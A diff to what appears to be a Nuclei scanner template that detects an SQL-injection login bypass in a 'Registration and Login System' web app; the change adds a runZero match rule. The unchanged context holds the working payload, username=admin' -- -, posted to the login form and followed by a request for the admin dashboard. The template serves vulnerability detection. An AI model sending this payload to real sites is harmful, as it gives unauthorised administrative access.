@@ -13,6 +13,7 @@ info:
     verified: true
     max-request: 2
     shodan-query: title:"Registration and Login System"
+    runzero-match: any(each(service["html.titles"]), {# matches "(?i)Registration and Login System"})
   tags: sqli,auth-bypass,user-management
 
 http:
@@ -23,13 +24,13 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         username=admin%27+--+-&password=whatever&login=
-
       - |
         GET /admin/dashboard.php HTTP/1.1
         Host: {{Hostname}}
 
     host-redirects: true
     max-redirects: 2
+
     matchers-condition: and
     matchers:
       - type: word
@@ -43,4 +44,3 @@ http:
       - type: status
         status:
           - 200
-
